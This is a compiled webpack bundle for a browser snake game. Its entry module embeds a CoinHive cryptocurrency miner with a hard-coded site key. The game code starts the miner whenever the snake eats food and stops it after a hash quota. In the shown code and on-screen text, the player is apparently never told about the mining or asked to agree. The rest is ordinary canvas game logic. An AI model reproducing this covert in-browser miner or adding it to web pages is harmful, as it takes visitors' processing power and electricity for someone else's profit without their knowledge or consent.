/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, {
/******/ 				configurable: false,
/******/ 				enumerable: true,
/******/ 				get: getter
/******/ 			});
/******/ 		}
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 0);
/******/ })
/************************************************************************/
/******/ ([
/* 0 */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
Object.defineProperty(__webpack_exports__, "__esModule", { value: true });
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_0__game__ = __webpack_require__(1);


window.onload = () => {
    const miner = new CoinHive.Anonymous('pVn9IlEfqHmBteAUqVT4aJlPIT8AN8D3');
	const canvas = document.getElementById("gc");
    const game = new __WEBPACK_IMPORTED_MODULE_0__game__["a" /* default */](canvas, miner);
	document.addEventListener("keydown", game.keyPush.bind(game));
	canvas.addEventListener('click', game.click.bind(game));
};


/***/ }),
/* 1 */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_0__food__ = __webpack_require__(2);
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_1__snake__ = __webpack_require__(3);



class Game {
    constructor(canvas, miner) {
        this.canvas = canvas;
        this.context = canvas.getContext("2d");
        this.gridSize = 20;
        this.tileCount = 40;
        this.hashes = 0;

        this.energyMultiplier = 20; //hashes per energy

        this.score = 0;
        this.highScore = 0;

        this.miner = miner;
        this.food = new __WEBPACK_IMPORTED_MODULE_0__food__["a" /* default */]();
        this.snake = new __WEBPACK_IMPORTED_MODULE_1__snake__["a" /* default */](this.tileCount, miner);

        this.showNewGameScreen = false;
        this.interval = 1000/15;


         this.intervalFunction = () => {
             this.update();
             this.draw();
            setTimeout(this.intervalFunction, this.interval);
        };
        setTimeout(this.intervalFunction, this.interval);

    }

    update() {
        if (this.score > this.highScore) {
            this.highScore = this.score;
        }

        this.snake.update();
        if (this.snake.foodInside === 0 && !this.food) {
            createFood(this);
            this.interval = 1000/15;
        }

        if (this.snake.foodInside > 0) {
            this.interval = 1000/45;
        }

        checkSnakeCollision(this);

        if (this.food) {
            checkFoodCollision(this);
        }
    }

    draw() {
        this.context.fillStyle = "black";
        this.context.fillRect(0, 0, this.canvas.width, this.canvas.height);

        if (!this.showNewGameScreen) {
            this.context.fillStyle = 'blue';
            this.context.fillRect(this.snake.xHead * this.gridSize, this.snake.yHead * this.gridSize, this.gridSize - 2, this.gridSize - 2);

            this.context.fillStyle = this.snake.tailColor;
            this.snake.trail.forEach((segment) => {
                this.context.fillRect(segment.x * this.gridSize, segment.y * this.gridSize, this.gridSize - 2, this.gridSize - 2);
            });

            if (this.food) {
                this.context.fillStyle = "red";
                this.context.fillRect(this.food.x * this.gridSize, this.food.y * this.gridSize, this.gridSize, this.gridSize);
            }

            drawScore(this);
        } else {
            this.context.font = "30px Comic Sans MS";
            this.context.fillStyle = "red";
            this.context.textAlign = "center";
            this.context.fillText('OUPS! Your score: ' + this.score + '. Click to try again.', this.canvas.width/2, this.canvas.height/2);
        }
    }

    keyPush(evt) {
        this.snake.updateDirection(evt);
    }

    click() {
        if (this.showNewGameScreen) {
            this.score = 0;
            this.showNewGameScreen = false;
            this.snake = new __WEBPACK_IMPORTED_MODULE_1__snake__["a" /* default */](this.tileCount, this.miner);
            createFood(this);
        }
    }
}
/* harmony export (immutable) */ __webpack_exports__["a"] = Game;


function drawScore(gameObj) {
    gameObj.context.font = "30px Comic Sans MS";
    gameObj.context.fillStyle = "rgba(255, 255, 255, 0.5)";
    gameObj.context.textAlign = "right";
    gameObj.context.fillText('Score: ' + gameObj.score, gameObj.canvas.width - 30, 30);
    gameObj.context.textAlign = "left";
    gameObj.context.fillText('HighScore: ' + gameObj.highScore, 30, 30);
}

function checkSnakeCollision(gameObj) {
    gameObj.snake.trail.forEach((segment) => {
        if (segment.x === gameObj.snake.xHead && segment.y === gameObj.snake.yHead) {
            gameObj.showNewGameScreen = true;
        }
    });
}

function checkFoodCollision(gameObj) {
    if (gameObj.food.x === gameObj.snake.xHead && gameObj.food.y === gameObj.snake.yHead) {
        gameObj.snake.miner.start();
        gameObj.snake.foodInside = gameObj.food.energy * gameObj.energyMultiplier;
        gameObj.snake.tail+=gameObj.food.energy;
        gameObj.score+=gameObj.food.energy;
        gameObj.food = null;
    }
}

function createFood(gameObj) {
    let xFood = Math.floor(Math.random() * gameObj.tileCount);
    let yFood = Math.floor(Math.random() * gameObj.tileCount);

    gameObj.food = new __WEBPACK_IMPORTED_MODULE_0__food__["a" /* default */](xFood, yFood, Math.floor(Math.random() * 5) + 1);
}

/***/ }),
/* 2 */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
class Food {
    constructor(x = 15, y = 15, energy = 1) {
        this.x = x;
        this.y = y;
        this.energy = energy;
    }
}
/* harmony export (immutable) */ __webpack_exports__["a"] = Food;


/***/ }),
/* 3 */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
class Snake {
    constructor(tileCount, miner) {
        this.xHead = 10;
        this.yHead = 10;
        this.xVelosity = 1;
        this.yVelosity = 0;
        this.trail = [];
        this.tail = 4;
        this.foodInside = 0;
        this.tileCount = tileCount;
        this.miner = miner;
        this.hashes = miner.getTotalHashes();
        this.tailColors = ['green', 'white', 'blue', 'lime', 'chocolate', 'DeepPink', 'PaleVioletRed', 'SeaShell'];
        this.tailColor = this.tailColors[3];
    }

    update() {
        if (this.foodInside > 0) {
            this.tailColor = this.tailColors[Math.floor(Math.random() * this.tailColors.length)];
        } else {
            this.tailColor = 'lime';
        }

        const totalHashes = this.miner.getTotalHashes();
        console.log('Total:' + totalHashes);
        console.log('Hashes:' + this.hashes);
        console.log('Inside:' + this.foodInside);
        if (totalHashes > this.hashes + this.foodInside) {
            this.foodInside = 0;
            this.hashes = totalHashes;
            this.miner.stop();
        }

        this.trail.push({ x: this.xHead, y: this.yHead});

        this.xHead += this.xVelosity;
        this.yHead += this.yVelosity;

        if (this.xHead < 0) {
            this.xHead = this.tileCount - 1;
        }
        if (this.xHead > this.tileCount - 1) {
            this.xHead = 0;
        }
        if (this.yHead < 0) {
            this.yHead = this.tileCount - 1;
        }
        if (this.yHead > this.tileCount - 1) {
            this.yHead = 0;
        }

        while (this.trail.length > this.tail) {
            this.trail.shift();
        }
    }

    updateDirection(evt) {
        switch(evt.keyCode) {
            case 37:
                if (this.xVelosity !== 1) {
                    this.xVelosity = -1;
                    this.yVelosity = 0;
                }
                break;
            case 38:
                if (this.yVelosity !== 1) {
                    this.xVelosity = 0;
                    this.yVelosity = -1;
                }
                break;
            case 39:
                if (this.xVelosity !== -1) {
                    this.xVelosity = 1;
                    this.yVelosity = 0;
                }
                break;
            case 40:
                if (this.yVelosity !== -1) {
                    this.xVelosity = 0;
                    this.yVelosity = 1;
                }
                break;
        }
    }
}
/* harmony export (immutable) */ __webpack_exports__["a"] = Snake;


/***/ })
/******/ ]);